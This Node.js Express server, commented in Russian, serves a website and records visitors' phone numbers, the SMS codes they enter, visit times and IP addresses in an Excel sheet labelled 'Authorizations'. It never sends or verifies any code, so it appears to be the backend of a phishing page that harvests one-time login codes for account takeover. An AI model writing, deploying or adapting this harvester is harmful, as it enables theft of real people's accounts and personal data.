const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const ExcelJS = require('exceljs');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.json());

// Раздаем файлы сайта (HTML, CSS, JS) из текущей папки
app.use(express.static(__dirname));

const FILE_PATH = path.join(__dirname, 'data.xlsx');

async function createNewExcel() {
  const workbook = new ExcelJS.Workbook();
  const worksheet = workbook.addWorksheet('Авторизации');
  worksheet.columns = [
    { header: 'ID', width: 25 },
    { header: 'Телефон', width: 20 },
    { header: 'Время визита', width: 25 },
    { header: 'SMS-код', width: 15 },
    { header: 'IP', width: 20 }
  ];
  await workbook.xlsx.writeFile(FILE_PATH);
}

async function getWorkbook() {
  const workbook = new ExcelJS.Workbook();
  try {
    await workbook.xlsx.readFile(FILE_PATH);
    return workbook;
  } catch (err) {
    await createNewExcel();
    await workbook.xlsx.readFile(FILE_PATH);
    return workbook;
  }
}

async function initExcel() {
  if (!fs.existsSync(FILE_PATH)) {
    await createNewExcel();
  }
}

app.post('/api/visit', (req, res) => {
  const userIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  console.log(`[ВИЗИТ] ID: ${req.body.id} | IP: ${userIp}`);
  res.json({ success: true });
});

app.post('/api/phone', async (req, res) => {
  const { id, phone, timestamp } = req.body;
  const userIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  try {
    const workbook = await getWorkbook();
    const worksheet = workbook.getWorksheet('Авторизации') || workbook.addWorksheet('Авторизации');

    worksheet.addRow([id, phone, timestamp, '', userIp]);
    await workbook.xlsx.writeFile(FILE_PATH);
    console.log(`[ТЕЛЕФОН СОХРАНЕН] ID: ${id} | Телефон: ${phone}`);
    res.json({ status: 'ok' });
  } catch (error) {
    console.error('Ошибка записи:', error);
    res.status(500).json({ error: 'Ошибка записи' });
  }
});

app.post('/api/sms', async (req, res) => {
  const { id, smsCode } = req.body;

  try {
    const workbook = await getWorkbook();
    const worksheet = workbook.getWorksheet('Авторизации') || workbook.addWorksheet('Авторизации');

    let found = false;
    worksheet.eachRow((row) => {
      if (row.getCell(1).value === id) {
        row.getCell(4).value = smsCode;
        found = true;
      }
    });

    if (!found) {
      worksheet.addRow([id, '-', new Date().toLocaleString(), smsCode, '']);
    }

    await workbook.xlsx.writeFile(FILE_PATH);
    console.log(`[SMS СОХРАНЕН] ID: ${id} | Код: ${smsCode}`);
    res.json({ status: 'ok' });
  } catch (error) {
    console.error('Ошибка записи:', error);
    res.status(500).json({ error: 'Ошибка записи' });
  }
});

// Слушаем динамический порт от PaaS или 3000 локально
const PORT = process.env.PORT || 3000;

initExcel().then(() => {
  app.listen(PORT, () => console.log(`Сервер запущен на порту ${PORT}`));
});